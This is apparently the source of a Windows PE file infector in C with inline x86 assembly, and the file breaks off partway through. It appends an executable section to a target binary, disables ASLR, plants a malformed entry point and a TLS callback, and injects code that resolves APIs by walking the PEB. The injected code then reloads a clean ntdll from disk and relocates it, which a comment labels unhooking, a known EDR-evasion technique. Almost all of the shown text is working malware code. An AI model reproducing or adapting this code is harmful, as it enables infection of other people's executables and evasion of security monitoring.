#include <windows.h>
#include <imagehlp.h>
#include <winternl.h>
#include <stdio.h>
#include <excpt.h>
#define WIN32_LEAN_AND_MEAN
#define bb(x) __asm _emit x

#pragma comment(lib, "imagehlp")
//#pragma warning(disable : 4996)  

////////////////////////Alignment 
DWORD align(DWORD size, DWORD align, DWORD addr) {
	if (!(size % align))
		return addr + size;
	return addr + (size / align + 1) * align;
}


//////////////////////////AddSection Function
int AddSection(char *filepath, char *sectionName, DWORD sizeOfSection) 
{
	/////////////Handle to file
	HANDLE file = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) 
	{
		CloseHandle(file);
		return 0;
	}

	///////////filesize of file
	DWORD fileSize = GetFileSize(file, NULL);
	if (!fileSize) 
	{
		CloseHandle(file);
		//empty file,thus invalid
		return -1;
	}

	////////////////so we know how much buffer to allocate, Simply returns ptr (no storage is allocated).A pointer to an already-allocated memory block of the proper size.
	BYTE *pByte = new BYTE[fileSize];
	DWORD dw;

	////////////////lets read the entire file,so we can use the PE information
	ReadFile(file, pByte, fileSize, &dw, NULL);

	////////////////check dos signature validity
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE) 
	{
		CloseHandle(file);
		return -1; //invalid PE
	}

	///////////////check 32-bit image
	PIMAGE_NT_HEADERS NT = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew);
	if (NT->FileHeader.Machine != IMAGE_FILE_MACHINE_I386)
	{
		CloseHandle(file);
		return -3;//x64 image
	}

	///////////////// SH = First section
	PIMAGE_SECTION_HEADER SH = IMAGE_FIRST_SECTION(NT);
	

	//////////////////sCount = Number of sections
	WORD sCount = NT->FileHeader.NumberOfSections;
	//printf("Number Of Sections is: %d\n", sCount);
	

	/////////// go through all the sections,to see if section,already exists 
	for (int i = 0; i < sCount; i++) {
		PIMAGE_SECTION_HEADER x = SH + i;
		if (!strcmp((char *)x->Name, sectionName)) {
			//PE section already exists
			CloseHandle(file);
			return -2;
		}
	}

	///////////////fill last section with zeros
	ZeroMemory(&SH[sCount], sizeof(IMAGE_SECTION_HEADER));
	///////////////We use 8 bytes for section name,cause it is the maximum allowed section name size
	CopyMemory(&SH[sCount].Name, sectionName, 8);

	/////////////////lets insert all the required information about our new PE section
	SH[sCount].Misc.VirtualSize = align(sizeOfSection, NT->OptionalHeader.SectionAlignment, 0);
	SH[sCount].VirtualAddress = align(SH[sCount - 1].Misc.VirtualSize, NT->OptionalHeader.SectionAlignment, SH[sCount - 1].VirtualAddress);
	SH[sCount].SizeOfRawData = align(sizeOfSection, NT->OptionalHeader.FileAlignment, 0);
	SH[sCount].PointerToRawData = align(SH[sCount - 1].SizeOfRawData, NT->OptionalHeader.FileAlignment, SH[sCount - 1].PointerToRawData);
	SH[sCount].Characteristics = 0xE00000E0; // 0xE00000E0 = IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_UNINITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ
	SH[sCount].PointerToRelocations = 0;
	SH[sCount].PointerToLinenumbers = 0;
	SH[sCount].NumberOfRelocations = 0;
	SH[sCount].NumberOfLinenumbers = 0;
	
	///////Set a file pointer where last section ends 
	SetFilePointer(file, SH[sCount].PointerToRawData + SH[sCount].SizeOfRawData, NULL, FILE_BEGIN);
	///////set new end of file ,on the last section + it's own size
	SetEndOfFile(file);
	////////// change the size of the image,to correspond to the modifications, by adding a new section,the image size is bigger now
	NT->OptionalHeader.SizeOfImage = SH[sCount].VirtualAddress + SH[sCount].Misc.VirtualSize;
	
	/////////////  change the NumberOfSectons 
	NT->FileHeader.NumberOfSections += 1;
	
	////////Set a file pointer to the beginning of the file
	SetFilePointer(file, 0, NULL, FILE_BEGIN);
	////////so we can flush all the modifications to the file
	WriteFile(file, pByte, fileSize, &dw, NULL);

	CloseHandle(file);
	return 1;
}



/////////Adds the actual Code
bool AddCode(char *filepath)
{
	HANDLE file = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE)
	{
		CloseHandle(file);
		return false;
	}

	DWORD filesize = GetFileSize(file, NULL);

	BYTE *pByte = new BYTE[filesize];
	DWORD dw;

	ReadFile(file, pByte, filesize, &dw, NULL);

	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew);

	////////We disable ASLR 
	nt->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;

	//printf("ASLR disabled\n");
	//nt->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_NX_COMPAT;

	//////get to the last section where we will write our code
	PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(nt);
	PIMAGE_SECTION_HEADER last = first + (nt->FileHeader.NumberOfSections - 1);

	SetFilePointer(file, 0, 0, FILE_BEGIN);
	////////Save the oldEntryPoint
	DWORD OEP = nt->OptionalHeader.AddressOfEntryPoint + nt->OptionalHeader.ImageBase;
	printf("Original Entry Point is: %08x\n", OEP);
	nt->OptionalHeader.AddressOfEntryPoint = 0x0acab666; //last->VirtualAddress;
	// this is an intended malformation theoretically when AddressOfEntryPoint equ 0x00000000
	//execution starts in the DOS header but we have TLS Callbacks in place 
	//alternatively set AddressOfEntryPoint = last->VirtualAddress; i dont think really matters!!!    
	printf("New Entry Point is: %08x\n", nt->OptionalHeader.AddressOfEntryPoint);
	//precomputed checksum 
	nt->OptionalHeader.CheckSum = 0x000c3e32;
	WriteFile(file, pByte, filesize, &dw, 0);

	////////////////We Update TLS Directory, directory number 9
	nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size = sizeof(IMAGE_TLS_DIRECTORY);
	nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = last->VirtualAddress + 4; //it starts 4 bytes after the start of last section

	////////////Write to file so far
	SetFilePointer(file, 0, 0, FILE_BEGIN);
	WriteFile(file, pByte, filesize, &dw, 0);

	////////////Set a pointer to last sections start and write four null bytes
	SetFilePointer(file, last->PointerToRawData, NULL, FILE_BEGIN);
	char index[4] = { 0x00, 0x00, 0x00, 0x00 };
	WriteFile(file, index, sizeof(index), &dw, 0);

	//////////////Set file pointer after the four null bytes
	SetFilePointer(file, last->PointerToRawData + 4, NULL, FILE_BEGIN);
	//////////// where we create the TLS_DIRECTORY
	IMAGE_TLS_DIRECTORY* pTLS = new IMAGE_TLS_DIRECTORY();

	/////////////the AddressOfIndex inside the tls directory points exactly after the directory which is 28 bytes, 4*0x00 + 24 for the tls directory 
	pTLS->AddressOfIndex = nt->OptionalHeader.ImageBase + last->VirtualAddress + 28;
	////////the AddressOfCallBacks points to the 1st callback it is located at: 0x00*4 + 24(tlsdirectory) + 4(addressofindex) = 32
	pTLS->AddressOfCallBacks = nt->OptionalHeader.ImageBase + last->VirtualAddress + 32;
	WriteFile(file, (PVOID)pTLS, sizeof(IMAGE_TLS_DIRECTORY), &dw, 0);

	////////
	SetFilePointer(file, last->PointerToRawData + 28, NULL, FILE_BEGIN);
	DWORD dwOffsetOfIndexDWORD = nt->OptionalHeader.ImageBase + last->VirtualAddress;
	WriteFile(file, &dwOffsetOfIndexDWORD, sizeof(DWORD), &dw, 0);

	////////////
	SetFilePointer(file, last->PointerToRawData + 32, NULL, FILE_BEGIN);
	DWORD dwOffsetOfCodeDWORD = nt->OptionalHeader.ImageBase + last->VirtualAddress + 16 + sizeof(IMAGE_TLS_DIRECTORY);
	WriteFile(file, &dwOffsetOfCodeDWORD, sizeof(DWORD), &dw, 0);

	///////////////make room for another callback + 4 null bytes to end it
	SetFilePointer(file, last->PointerToRawData + 36, NULL, FILE_BEGIN);
	char index2[12] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
	WriteFile(file, index, sizeof(index), &dw, 0);
	
	//////////////////////////////////////////////////////////////////
	DWORD start(0), end(0);

	__asm
	{
		mov eax, loc1
		mov[start], eax
		jmp over //we jump over the second __asm,so we dont execute it in the infector itself
		loc1 :
	}

	
	////////////////////////////////////Add TLS Dynamically
		//DWORD SectionStart;
	__asm {
		call next
		next :
		pop eax           //get current instruction address is start + 5
		mov ebx, eax		//store address
		sub eax, 0x2d		// sub (24 + 5)h=29h to go to section start
		//mov SectionStart, eax
		add eax, 0x24			//2nd callback address
		add ebx, 0xf
		//add ebx, 0x15			//ebx has the address where the next snippet of code starts
		mov[eax], ebx
		retn	
	}


	///////////////////////////////////////////////////////////////Unhooking code manual loading and mapping ntdll from disk and compare with the one already loaded
	///////////////////////todo : for any dll
	DWORD Create_FileW;
	HANDLE hFile;
	DWORD Create_File_MappingW;
	HANDLE hMap;
	DWORD Map_View_Of_File;
	PCHAR pFile;
	DWORD Virtual_Alloc;
	PCHAR pLibraryAddr;
	DWORD mem_cpy;
	ULONG_PTR pDllBase;
	ULONG_PTR pInitialImageBase;
	DWORD mem_cmp;
	DWORD Virtual_Protect;
	DWORD ddOldProtect;
	DWORD Section_Virtual_Size;
	DWORD Close_Handle_function;
	DWORD nt_set_information_thread;
	DWORD user32_base;
	DWORD create_desktop_A;
	DWORD switch_desktop;
	DWORD load_library_A;
	DWORD get_proc_address;
	DWORD getversion;
	DWORD nt_query_information_process;
	DWORD rtl_query_create_debug_buffer;
	DWORD rtl_query_process_debug_information;
	DWORD create_file_A;

	__asm {
		
		pushad
		push ebp
		mov ebp, esp
		sub esp, 0x200
		///////////Find CreateFileW					todo:	use NtCreateFile exported by ntdll instead 
		mov eax, fs : [30h];						eax = PEB
		mov eax, [eax + 0x0c];						eax = PPEB->PPEB_LDR_DATA
		mov eax, [eax + 0x14];						eax = PPEB->PPEB_LDR_DATA->InMemoryOrderModuleList.Flink
		mov eax, [eax];								eax = next link = ntdll LDR_MODULE entry
		mov eax, [eax];								eax = next link = kernel32 LDR_MODULE entry
		mov eax, [eax + 0x10]; 16				    eax = kernel32 LDR_MODULE DllBase
		mov   ebx, eax;								ebx = kernel32 LDR_MODULE DllBase
		mov   eax, [ebx + 0x3c]; PE header VMA		eax = DllBase + e_lfanew(+0x3c) = PEHeader of kernel32
		mov   edi, [ebx + eax + 0x78];				edi = start of Export table relative offset  PE + 0x78 (i.e., offset 120 bytes) is the relative address(relative to DLL base address) of the export table
		add   edi, ebx;								edi = Export table VirtualAddress
		mov   ecx, [edi + 0x18];					ecx = export table + Number of names(+0x18) the counter to parse all functions in dll NumberOfNames
		mov   edx, [edi + 0x20];					edx = export table + Names table relative offset(+0x20)   DWORD AddressOfNames; //offset 0x20
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNames Virtual Memory Address
		
		Create_FileW_loop_1 :
		dec ecx										
		mov esi, [edx + ecx * 4];					esi = AddressOfNames + NumberOfNames*4(because its an address) = the relative offset of the current name from the start of AddressOfNames 
		add esi, ebx;								esi = +the base address of dll stored in ebx to obtain the Virtual Memory Address of the current name
		cmp dword ptr[esi], 0x61657243;				comparison of name, backwards order of bytes, Crea = 43 72 65 61  
		je Create_FileW_loop_2
		jmp Create_FileW_loop_1
		Create_FileW_loop_2 :
		cmp dword ptr[esi + 0x7], 0x57656c69;		ileW = 69 6c 65 57
		je stopped_Create_FileW_loop;
		jmp Create_FileW_loop_1
		stopped_Create_FileW_loop:
		mov   edx, [edi + 0x24];					edx = Export table VirtualAddress + 0x24 = AddressOfNameOrdinals relative offset
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNameOrdinals Virtual Memory Address
		mov   cx, [edx + 2 * ecx];					ecx = AddressOfNameOrdinals + 2*NumberOfNames to walk the function ordinals
		mov   edx, [edi + 0x1c];					edx = Export table VirtualAddress + 0x1c = AddressOfFunctions relative offset
		add   edx, ebx; Table address				edx = +the base address of dll stored in ebx to obtain AddressOfFunctions Virtual Memory Address
		mov   eax, [edx + 4 * ecx];					eax = AddressOfFunctions Virtual Memory Address + 4*ecx
		add   eax, ebx;								eax = +the base address of dll stored in ebx to obtain Function Virtual Memory Address of CreateFileW
		mov Create_FileW, eax
		
		mov eax, fs : [30h];						eax = PEB
		mov eax, [eax + 0x0c];						eax = PPEB->PPEB_LDR_DATA
		mov eax, [eax + 0x14];						eax = PPEB->PPEB_LDR_DATA->InMemoryOrderModuleList.Flink
		mov eax, [eax];								eax = next link = ntdll LDR_MODULE entry
		mov eax, [eax + 0x20];						edx = FullDllName of ntdll
		
		//call CreateFileW
		push NULL
		push FILE_ATTRIBUTE_NORMAL
		push OPEN_EXISTING
		push NULL
		push FILE_SHARE_READ
		push GENERIC_READ
		push eax
		call Create_FileW;							call = CreateFileW(FullDllName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)
		mov hFile, eax;								obtain Handle hFile to file ntdll.dll from disk

		///////////Find CreateFileMappingW			 
		mov eax, fs : [30h];						eax = PEB
		mov eax, [eax + 0x0c];						eax = PPEB->PPEB_LDR_DATA
		mov eax, [eax + 0x14];						eax = PPEB->PPEB_LDR_DATA->InMemoryOrderModuleList.Flink
		mov eax, [eax];								eax = next link = ntdll LDR_MODULE entry
		mov eax, [eax];								eax = next link = kernel32 LDR_MODULE entry
		mov eax, [eax + 0x10]; 16				    eax = kernel32 LDR_MODULE DllBase
		mov   ebx, eax;								ebx = kernel32 LDR_MODULE DllBase
		mov   eax, [ebx + 0x3c]; PE header VMA		eax = DllBase + e_lfanew(+0x3c) = PEHeader of kernel32
		mov   edi, [ebx + eax + 0x78];				edi = start of Export table relative offset  PE + 0x78 (i.e., offset 120 bytes) is the relative address(relative to DLL base address) of the export table
		add   edi, ebx;								edi = Export table VirtualAddress
		mov   ecx, [edi + 0x18];					ecx = export table + Number of names(+0x18) the counter to parse all functions in dll NumberOfNames
		mov   edx, [edi + 0x20];					edx = export table + Names table relative offset(+0x20)   DWORD AddressOfNames; //offset 0x20
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNames Virtual Memory Address
		
		Create_File_MappingW_loop_1 :
		dec ecx										
		mov esi, [edx + ecx * 4];					esi = AddressOfNames + NumberOfNames*4(because its an address) = the relative offset of the current name from the start of AddressOfNames 
		add esi, ebx;								esi = +the base address of dll stored in ebx to obtain the Virtual Memory Address of the current name
		cmp dword ptr[esi], 0x61657243;				comparison of name, backwards order of bytes, Crea = 43 72 65 61  
		je Create_File_MappingW_loop_2
		jmp Create_File_MappingW_loop_1
		Create_File_MappingW_loop_2 :
		cmp dword ptr[esi + 0xe], 0x57676e69;		ingW = 69 6e 67 57
		je stopped_Create_File_MappingW_loop;
		jmp Create_File_MappingW_loop_1
		stopped_Create_File_MappingW_loop:
		mov   edx, [edi + 0x24];					edx = Export table VirtualAddress + 0x24 = AddressOfNameOrdinals relative offset
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNameOrdinals Virtual Memory Address
		mov   cx, [edx + 2 * ecx];					ecx = AddressOfNameOrdinals + 2*NumberOfNames to walk the function ordinals
		mov   edx, [edi + 0x1c];					edx = Export table VirtualAddress + 0x1c = AddressOfFunctions relative offset
		add   edx, ebx; Table address				edx = +the base address of dll stored in ebx to obtain AddressOfFunctions Virtual Memory Address
		mov   eax, [edx + 4 * ecx];					eax = AddressOfFunctions Virtual Memory Address + 4*ecx
		add   eax, ebx;								eax = +the base address of dll stored in ebx to obtain Function Virtual Memory Address of CreateFileMappingW
		mov Create_File_MappingW, eax
		/////call CreateFileMappingW
		push NULL
		push 0
		push 0 
		push PAGE_READONLY
		push NULL
		push hFile
		call Create_File_MappingW;					call = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0 ,0, NULL)
		mov hMap, eax;								obtain handle to mapping hMap 

		///////////Find MapViewOfFile				todo:use NtMapViewOfSection exported by ntdll.dll instead
		mov eax, fs : [30h];						eax = PEB
		mov eax, [eax + 0x0c];						eax = PPEB->PPEB_LDR_DATA
		mov eax, [eax + 0x14];						eax = PPEB->PPEB_LDR_DATA->InMemoryOrderModuleList.Flink
		mov eax, [eax];								eax = next link = ntdll LDR_MODULE entry
		mov eax, [eax];								eax = next link = kernel32 LDR_MODULE entry
		mov eax, [eax + 0x10]; 16				    eax = kernel32 LDR_MODULE DllBase
		mov   ebx, eax;								ebx = kernel32 LDR_MODULE DllBase
		mov   eax, [ebx + 0x3c]; PE header VMA		eax = DllBase + e_lfanew(+0x3c) = PEHeader of kernel32
		mov   edi, [ebx + eax + 0x78];				edi = start of Export table relative offset  PE + 0x78 (i.e., offset 120 bytes) is the relative address(relative to DLL base address) of the export table
		add   edi, ebx;								edi = Export table VirtualAddress
		mov   ecx, [edi + 0x18];					ecx = export table + Number of names(+0x18) the counter to parse all functions in dll NumberOfNames
		mov   edx, [edi + 0x20];					edx = export table + Names table relative offset(+0x20)   DWORD AddressOfNames; //offset 0x20
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNames Virtual Memory Address
		
		Map_View_Of_File_loop_1 :
		dec ecx										
		mov esi, [edx + ecx * 4];					esi = AddressOfNames + NumberOfNames*4(because its an address) = the relative offset of the current name from the start of AddressOfNames 
		add esi, ebx;								esi = +th e base address of dll stored in ebx to obtain the Virtual Memory Address of the current name
		cmp dword ptr[esi], 0x5670614d;				comparison of name, backwards order of bytes, MapV = 4d 61 70 56
		je Map_View_Of_File_loop_2
		jmp Map_View_Of_File_loop_1
		Map_View_Of_File_loop_2 :
		cmp dword ptr[esi + 0xa], 0x00656c69;		ile = 69 6c 65 00
		je stopped_Map_View_Of_File_loop;
		jmp Map_View_Of_File_loop_1
		stopped_Map_View_Of_File_loop:
		mov   edx, [edi + 0x24];					edx = Export table VirtualAddress + 0x24 = AddressOfNameOrdinals relative offset
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNameOrdinals Virtual Memory Address
		mov   cx, [edx + 2 * ecx];					ecx = AddressOfNameOrdinals + 2*NumberOfNames to walk the function ordinals
		mov   edx, [edi + 0x1c];					edx = Export table VirtualAddress + 0x1c = AddressOfFunctions relative offset
		add   edx, ebx; Table address				edx = +the base address of dll stored in ebx to obtain AddressOfFunctions Virtual Memory Address
		mov   eax, [edx + 4 * ecx];					eax = AddressOfFunctions Virtual Memory Address + 4*ecx
		add   eax, ebx;								eax = +the base address of dll stored in ebx to obtain Function Virtual Memory Address of MapViewOfFile
		mov Map_View_Of_File, eax
		//////////call MapViewOfFile
		push 0
		push 0
		push 0
		push FILE_MAP_READ
		push hMap
		call Map_View_Of_File;						call = MapViewOfFIle(hMap, FILE_MAP_READ, 0 , 0, 0)
		mov pFile, eax;								obtain pointer to start of mapped file (ntdll.dll) pFile

		///////////Find VirtualAlloc				todo: use NtAllocateVirtualMemory exported by ntdll.dll instead
		mov eax, fs : [30h];						eax = PEB
		mov eax, [eax + 0x0c];						eax = PPEB->PPEB_LDR_DATA
		mov eax, [eax + 0x14];						eax = PPEB->PPEB_LDR_DATA->InMemoryOrderModuleList.Flink
		mov eax, [eax];								eax = next link = ntdll LDR_MODULE entry
		mov eax, [eax];								eax = next link = kernel32 LDR_MODULE entry
		mov eax, [eax + 0x10]; 16				    eax = kernel32 LDR_MODULE DllBase
		mov   ebx, eax;								ebx = kernel32 LDR_MODULE DllBase
		mov   eax, [ebx + 0x3c]; PE header VMA		eax = DllBase + e_lfanew(+0x3c) = PEHeader of kernel32
		mov   edi, [ebx + eax + 0x78];				edi = start of Export table relative offset  PE + 0x78 (i.e., offset 120 bytes) is the relative address(relative to DLL base address) of the export table
		add   edi, ebx;								edi = Export table VirtualAddress
		mov   ecx, [edi + 0x18];					ecx = export table + Number of names(+0x18) the counter to parse all functions in dll NumberOfNames
		mov   edx, [edi + 0x20];					edx = export table + Names table relative offset(+0x20)   DWORD AddressOfNames; //offset 0x20
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNames Virtual Memory Address
		
		Virtual_Alloc_loop_1 :
		dec ecx										
		mov esi, [edx + ecx * 4];					esi = AddressOfNames + NumberOfNames*4(because its an address) = the relative offset of the current name from the start of AddressOfNames 
		add esi, ebx;								esi = +the base address of dll stored in ebx to obtain the Virtual Memory Address of the current name
		cmp dword ptr[esi], 0x74726956;				comparison of name, backwards order of bytes, Virt = 56 69 72 74
		je Virtual_Alloc_loop_2
		jmp Virtual_Alloc_loop_1
		Virtual_Alloc_loop_2 :
		cmp dword ptr[esi + 0x9], 0x00636f6c;		loc = 6c 6f 63 00
		je stopped_Virtual_Alloc_loop;
		jmp Virtual_Alloc_loop_1
		stopped_Virtual_Alloc_loop:
		mov   edx, [edi + 0x24];					edx = Export table VirtualAddress + 0x24 = AddressOfNameOrdinals relative offset
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNameOrdinals Virtual Memory Address
		mov   cx, [edx + 2 * ecx];					ecx = AddressOfNameOrdinals + 2*NumberOfNames to walk the function ordinals
		mov   edx, [edi + 0x1c];					edx = Export table VirtualAddress + 0x1c = AddressOfFunctions relative offset
		add   edx, ebx; Table address				edx = +the base address of dll stored in ebx to obtain AddressOfFunctions Virtual Memory Address
		mov   eax, [edx + 4 * ecx];					eax = AddressOfFunctions Virtual Memory Address + 4*ecx
		add   eax, ebx;								eax = +the base address of dll stored in ebx to obtain Function Virtual Memory Address of VirtualAlloc
		mov Virtual_Alloc, eax
		
		mov eax, pFile;								eax = pDosHeader of ntdll
		mov ebx, [eax + 0x3c];						eax = pDosHeader + e_lfanew(0x1c) = pNtHeader
		add eax, ebx
		mov eax, [eax + 0x50];						ebx = pNtHeader->OptionalHeader.SizeOfImage
		

		///////call VirualAlloc
		push PAGE_READWRITE
		push MEM_COMMIT | MEM_RESERVE
		push eax
		push NULL
		call Virtual_Alloc							
		mov pLibraryAddr, eax;						pLibraryAddr = location where the library will be copied						

		///////////Find memcpy
		mov eax, fs : [30h];						eax = PEB
		mov eax, [eax + 0x0c];						eax = PPEB->PPEB_LDR_DATA
		mov eax, [eax + 0x14];						eax = PPEB->PPEB_LDR_DATA->InMemoryOrderModuleList.Flink
		mov eax, [eax];								eax = next link = ntdll LDR_MODULE entry
		mov eax, [eax + 0x10]; 16				    eax = ntdll LDR_MODULE DllBase
		mov   ebx, eax;								ebx = ntdll LDR_MODULE DllBase
		mov   eax, [ebx + 0x3c]; PE header VMA		eax = DllBase + e_lfanew(+0x3c) = PEHeader of kernel32
		mov   edi, [ebx + eax + 0x78];				edi = start of Export table relative offset  PE + 0x78 (i.e., offset 120 bytes) is the relative address(relative to DLL base address) of the export table
		add   edi, ebx;								edi = Export table VirtualAddress
		mov   ecx, [edi + 0x18];					ecx = export table + Number of names(+0x18) the counter to parse all functions in dll NumberOfNames
		mov   edx, [edi + 0x20];					edx = export table + Names table relative offset(+0x20)   DWORD AddressOfNames; //offset 0x20
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNames Virtual Memory Address
		
		memcpy_loop_1 :
		dec ecx										
		mov esi, [edx + ecx * 4];					esi = AddressOfNames + NumberOfNames*4(because its an address) = the relative offset of the current name from the start of AddressOfNames 
		add esi, ebx;								esi = +the base address of dll stored in ebx to obtain the Virtual Memory Address of the current name
		cmp dword ptr[esi], 0x636d656d;				comparison of name, backwards order of bytes, memc = 6d 65 6d 63
		je memcpy_loop_2
		jmp memcpy_loop_1
		memcpy_loop_2 :
		cmp dword ptr[esi + 0x3], 0x00797063;		opy = 63 70 79 00
		je stopped_memcpy_loop;
		jmp memcpy_loop_1
		stopped_memcpy_loop:
		mov   edx, [edi + 0x24];					edx = Export table VirtualAddress + 0x24 = AddressOfNameOrdinals relative offset
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNameOrdinals Virtual Memory Address
		mov   cx, [edx + 2 * ecx];					ecx = AddressOfNameOrdinals + 2*NumberOfNames to walk the function ordinals
		mov   edx, [edi + 0x1c];					edx = Export table VirtualAddress + 0x1c = AddressOfFunctions relative offset
		add   edx, ebx; Table address				edx = +the base address of dll stored in ebx to obtain AddressOfFunctions Virtual Memory Address
		mov   eax, [edx + 4 * ecx];					eax = AddressOfFunctions Virtual Memory Address + 4*ecx
		add   eax, ebx;								eax = +the base address of dll stored in ebx to obtain Function Virtual Memory Address of memcpy
		mov mem_cpy, eax
	
		/////////memcpy header
		mov eax, pFile;								eax = pDosHeader of ntdll
		mov ebx, [eax + 0x3c];						ebx = e_lfanew(+0x3c) = offset to NtHeader
		add eax, ebx;								eax = NtHeader
		mov eax, [eax + 0x54];						eax = pNtHeader->OptionalHeader.Headers					

		push eax
		push pFile
		push pLibraryAddr
		call mem_cpy

		/////////memcpy sections
		mov eax, pFile;								eax = pDosHeader of ntdll
		mov ebx, [eax + 0x3c];						ebx = e_lfanew(+0x3c) = offset to NtHeader
		add eax, ebx;								eax = NtHeader
		mov di, [eax + 0x06];						edi = pNtHeader->FileHeader.NumberOfSections	
		add eax, 0xf8;								eax = NtHeader + sizeof(IMAGE_NT_HEADERS) = pSectionHeader
		
		xor ecx, ecx
		copy_sections:
		push[eax + 0x10];							push sections SizeOfRawData
		mov edx, [eax + 0x14];						edx = sections PointerToRawData
		add edx, pFile;								edx = pFile + sections PointerToRawData
		push edx;									
		mov edx, [eax + 0x0c];						edx = sections VirtualAddress
		add edx, pLibraryAddr;						edx += pLibraryAddr
		push edx
		mov esi, ecx;								esi holds the counter ecx			
		call mem_cpy;								copy each section
		mov ecx, esi;								move the value from esi to ecx
		inc ecx;									increase ecx to go to next section
		mov eax, pFile;								eax = pDosHeader of ntdll
		mov ebx, [eax + 0x3c];						ebx = e_lfanew(+0x3c) = offset to NtHeader
		add eax, ebx;								eax = NtHeader
		add eax, 0xf8;								eax = NtHeader + sizeof(IMAGE_NT_HEADERS) = pSectionHeader	
		imul ebx, ecx , 0x28
		add eax, ebx 
		cmp cx, di	
		jne copy_sections

///////////////////////////////////fix relocations
		/////Store Initial ImageBase
		mov eax, pLibraryAddr;						eax = pDosHeader of ntdll loaded
		mov ebx, [eax + 0x3c];						ebx = e_lfanew(+0x3c) = offset to NtHeader
		add eax, ebx;								eax = NtHeader
		mov eax, [eax + 0x34];						eax = pNtHeader->OptionalHeader.ImageBase
		mov pInitialImageBase, eax
		/////Store Dllbase of already loaded dll
		mov eax, fs : [30h];						eax = PEB
		mov eax, [eax + 0x0c];						eax = PPEB->PPEB_LDR_DATA
		mov eax, [eax + 0x14];						eax = PPEB->PPEB_LDR_DATA->InMemoryOrderModuleList.Flink
		mov eax, [eax];								eax = next link = ntdll LDR_MODULE entry
		mov eax, [eax + 0x10];						edx = pDllBase
		mov pDllBase, eax
		//////set ImageBase to the ImageBase of already loaded module
		mov eax, pLibraryAddr;						eax = pDosHeader of ntdll loaded
		mov ebx, [eax + 0x3c];						ebx = e_lfanew(+0x3c) = offset to NtHeader
		add eax, ebx;								eax = NtHeader
		lea eax, [eax + 0x34];
		mov ebx, pDllBase
		mov [eax], ebx
		////////////////Check if any relocations Present
		mov eax, pLibraryAddr;						eax = pDosHeader of ntdll loaded
		mov ebx, [eax + 0x3c];						ebx = e_lfanew(+0x3c) = offset to NtHeader
		add eax, ebx;								eax = NtHeader
		add eax, 0xa4;								eax = NtHeader + 0xa4 = BaseRelocationTable Size
		mov eax, [eax]
		cmp eax, 0
		je fix_relocs_end
		/////////////////////
		fix_relocs:
		mov eax, pDllBase
		mov edx, eax
		mov ebx, pInitialImageBase
		sub edx, ebx//reloc delta
		je fix_relocs_end

		mov ebx, pLibraryAddr;						eax = pDosHeader of ntdll loaded
		mov edi, [ebx + 0x3c];						ebx = e_lfanew(+0x3c) = offset to NtHeader
		add ebx, edi
		add ebx, 0xa0;								eax = NtHeader + 0xa0 = BaseRelocationTable VirtualAddress
		mov ebx, [ebx];								 
		test ebx, ebx
		jz fix_relocs_end
		add ebx, pLibraryAddr
		
		fix_relocs_block:
		mov eax, [ebx + 0x04]          //ImageBaseRelocation.SizeOfBlock
		test eax, eax
		jz fix_relocs_end
		lea ecx, [eax - 0x08]
		shr ecx, 001h
		lea edi, [ebx + 0x08]
		fix_relocs_entry:
		movzx eax,word ptr [edi]																	//eax = pImageReloc->Type, higher bytes are zeroed
        push edx																					//push edx = delta for storing
        mov edx,eax																					//edx = eax = pImageReloc->Type, higher bytes are zeroed																				
        shr eax,00Ch           																	    //eax = divided by 4096,, Type = Entry >> 12
        mov esi,[pLibraryAddr]																//esi = ImageBase
        and dx,00FFFh																				// dx and 0x0fff
        add esi,[ebx]																				//esi = ImageBase + pBaseReloc
        add esi,edx																					//esi = ImageBase + pBaseReloc + offset
        pop edx	

		fix_relocs_HIGH:																			// IMAGE_REL_BASED_HIGH  
		dec eax																						//dec eax
		jnz fix_relocs_LOW
		mov eax, edx																				//eax =delta
		shr eax, 010h																				//HIWORD(Delta)
		jmp fix_relocs_LOW_fix
		fix_relocs_LOW :																			 // IMAGE_REL_BASED_LOW 
		dec eax
		jnz fix_relocs_HIGHLOW
		movzx eax, dx																				//LOWORD(Delta)
		fix_relocs_LOW_fix :
		add word ptr[esi], ax																		// mem[x] = mem[x] + delta_ImageBase
		jmp fix_relocs_next_entry		
		fix_relocs_HIGHLOW :																		// IMAGE_REL_BASED_HIGHLOW
		dec eax
		jnz fix_relocs_next_entry
		add[esi], edx																				// mem[x] = mem[x] + delta_ImageBase
		fix_relocs_next_entry :
